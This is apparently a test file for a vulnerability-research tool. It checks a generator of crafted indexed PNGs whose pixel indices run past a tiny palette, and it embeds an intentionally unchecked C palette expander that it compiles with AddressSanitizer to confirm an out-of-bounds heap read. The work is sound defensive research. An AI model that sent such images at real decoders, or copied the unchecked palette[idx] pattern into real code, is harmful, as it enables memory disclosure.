"""Directed trigger for a PNG palette (PLTE) over-read behind the container (analyze/poc/png_overread.py).

A detector narrows to the palette-index sink (stb_image's `stbi__expand_png_palette`: `palette[v]`
with v an unchecked pixel index); this builds the smallest VALID indexed PNG whose PLTE is tiny and
whose pixels are out of range, so the narrowed sink becomes a detonatable input -- no fuzzing. The
test validates the PNG without libpng (walks chunks, verifies CRCs, inflates IDAT) and, when a C
compiler + zlib are present, reproduces the exact out-of-bounds read on a faithful fixture of the
sink that parses the CONSTRUCTED bytes.
"""
from __future__ import annotations

import shutil
import struct
import subprocess
import zlib

import pytest

from lykos.analyze.poc import png_overread as po


def _walk_chunks(png: bytes):
    """[(type, data)] walking length+type+data+crc, asserting the CRC32 of each chunk."""
    assert png[:8] == b"\x89PNG\r\n\x1a\n"
    out, i = [], 8
    while i < len(png):
        ln = struct.unpack(">I", png[i:i + 4])[0]
        typ, data = png[i + 4:i + 8], png[i + 8:i + 8 + ln]
        crc = struct.unpack(">I", png[i + 8 + ln:i + 12 + ln])[0]
        assert crc == (zlib.crc32(typ + data) & 0xFFFFFFFF), ("bad CRC", typ)
        out.append((typ, data))
        i += 12 + ln
    return out


def test_png_is_structurally_valid_and_carries_the_out_of_range_index():
    png = po.png_overindexed(colors=2, index=255, width=8, height=2)
    chunks = _walk_chunks(png)
    assert [t for t, _ in chunks] == [b"IHDR", b"PLTE", b"IDAT", b"IEND"]
    ihdr = dict(zip(("w", "h", "depth", "ctype"), struct.unpack(">IIBB", chunks[0][1][:10])))
    assert ihdr["depth"] == 8 and ihdr["ctype"] == 3        # 8-bit indexed
    plte = chunks[1][1]
    assert len(plte) == 2 * 3                               # 2 palette entries
    raw = zlib.decompress(chunks[2][1])                     # scanlines: filter byte + indices
    rows = [raw[r * (ihdr["w"] + 1):(r + 1) * (ihdr["w"] + 1)] for r in range(ihdr["h"])]
    assert all(row[0] == 0 for row in rows)                 # filter type 0 (None)
    assert all(b == 255 for row in rows for b in row[1:])   # every pixel index is 255
    assert 255 >= len(plte) // 3                            # far past the 2-entry palette (deep read)


def test_a_higher_palette_count_still_encodes_an_out_of_range_index():
    png = po.png_overindexed(colors=16, index=200, width=4, height=1)
    chunks = _walk_chunks(png)
    assert len(chunks[1][1]) == 16 * 3                      # 16 palette entries
    raw = zlib.decompress(chunks[2][1])
    assert raw[1:] == bytes([200]) * 4 and 200 >= 16        # out of range for a 16-entry palette


def test_disclosure_oracle_is_sound_and_forgery_proof():
    """confirm_disclosure fires ONLY on a target that leaks offset-dependent heap, and rejects both a
    safe (clamping) target and an echo that cannot pass the negative control."""
    def heap(idx):
        return ((0xA0 ^ idx) & 0xFF, (idx * 3 + 5) & 0xFF, (idx * 7 + 9) & 0xFF)

    def _index_of(png):
        chunks = _walk_chunks(png)
        return zlib.decompress(chunks[2][1])[1]             # first pixel index

    def _palette_entry(idx):
        return ((idx * 17 + 1) & 0xFF, (idx * 29 + 7) & 0xFF, (idx * 43 + 13) & 0xFF)

    def vulnerable(png):
        idx = _index_of(png)
        return _palette_entry(idx) if idx < 2 else heap(idx)   # colors=2 default in the oracle

    def safe(png):                                             # clamps every index into the palette
        return _palette_entry(min(_index_of(png), 1))

    def echo(_png):                                            # constant, unrelated to idx
        return (1, 2, 3)

    assert po.confirm_disclosure(vulnerable)["disclosed"] is True
    sv = po.confirm_disclosure(safe)
    assert sv["disclosed"] is False and sv["control_ok"] is True       # safe -> no false positive
    ev = po.confirm_disclosure(echo)
    assert ev["disclosed"] is False and ev["control_ok"] is False      # echo fails the control


# A faithful fixture of the sink: a minimal real PNG palette expander (parse chunks, inflate IDAT,
# index the PLTE by each pixel byte) -- the stb_image stbi__expand_png_palette shape, which reads
# palette[idx] without checking idx against the entry count.
_VULN = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <zlib.h>
int main(int argc, char **argv){
    FILE *f = fopen(argv[1], "rb"); if (!f) return 2;
    fseek(f,0,SEEK_END); long n=ftell(f); fseek(f,0,SEEK_SET);
    unsigned char *b = malloc(n); if (fread(b,1,n,f)!=(size_t)n) return 2; fclose(f);
    unsigned char *plte=0; int pcount=0; unsigned char *idat=0; unsigned long ilen=0;
    unsigned w=0,h=0;
    long i=8;
    while (i+8<=n){
        unsigned len = ntohl(*(unsigned*)(b+i));
        unsigned char *typ=b+i+4; unsigned char *data=b+i+8;
        if (!memcmp(typ,"IHDR",4)){ w=ntohl(*(unsigned*)data); h=ntohl(*(unsigned*)(data+4)); }
        else if (!memcmp(typ,"PLTE",4)){ plte=data; pcount=len/3; }
        else if (!memcmp(typ,"IDAT",4)){ idat=realloc(idat,ilen+len); memcpy(idat+ilen,data,len); ilen+=len; }
        i += 12 + len;
    }
    unsigned long rawlen = (unsigned long)(w+1)*h;
    unsigned char *raw = malloc(rawlen);
    uncompress(raw,&rawlen,idat,ilen);
    unsigned long sink=0;
    for (unsigned y=0;y<h;y++){
        unsigned char *row = raw + (unsigned long)y*(w+1) + 1;   /* skip filter byte */
        for (unsigned x=0;x<w;x++){
            int idx = row[x];
            sink += plte[idx*3];                                 /* palette[idx] -- OOB when idx>=pcount */
        }
    }
    printf("%lu\n", sink);
    return 0;
}
"""


@pytest.mark.skipif(not (shutil.which("gcc") or shutil.which("cc")), reason="no C compiler")
def test_the_constructed_png_reproduces_an_out_of_bounds_read(tmp_path):
    src = tmp_path / "v.c"
    src.write_text(_VULN)
    exe = tmp_path / "v"
    cc = shutil.which("gcc") or shutil.which("cc")
    if subprocess.run([cc, "-g", "-O0", "-fsanitize=address", "-o", str(exe), str(src), "-lz"],
                      capture_output=True).returncode:
        pytest.skip("cannot build ASan+zlib fixture")
    png = po.png_overindexed(colors=2, index=200, width=8, height=2)
    inp = tmp_path / "in.png"
    inp.write_bytes(png)
    r = subprocess.run([str(exe), str(inp)], capture_output=True,
                       env={"ASAN_OPTIONS": "detect_leaks=0:abort_on_error=0"})
    assert b"heap-buffer-overflow" in r.stderr and b"READ of size" in r.stderr, \
        "the out-of-range palette index did not produce the expected OOB read"
